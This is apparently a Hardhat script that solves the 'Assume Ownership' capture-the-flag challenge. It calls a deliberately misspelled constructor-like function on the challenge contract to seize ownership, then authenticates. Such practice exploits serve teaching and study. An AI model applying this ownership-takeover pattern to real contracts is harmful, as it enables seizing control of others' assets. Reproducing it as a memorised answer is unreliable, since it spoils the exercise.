import { task } from "hardhat/config";

const contractAddress = "0x8F3428c13403EEc09abf105f592b1A8D7183c2A2";

task("assume-ownership", "Solves the 'Assume Ownership' challenge", async (_taskArgs, hre) => {
  const factory = await hre.ethers.getContractFactory("AssumeOwnershipChallenge");
  const contract = factory.attach(contractAddress);

  let tx;
  tx = await contract.AssumeOwmershipChallenge();
  await tx.wait();

  tx = await contract.authenticate();
  await tx.wait();
});
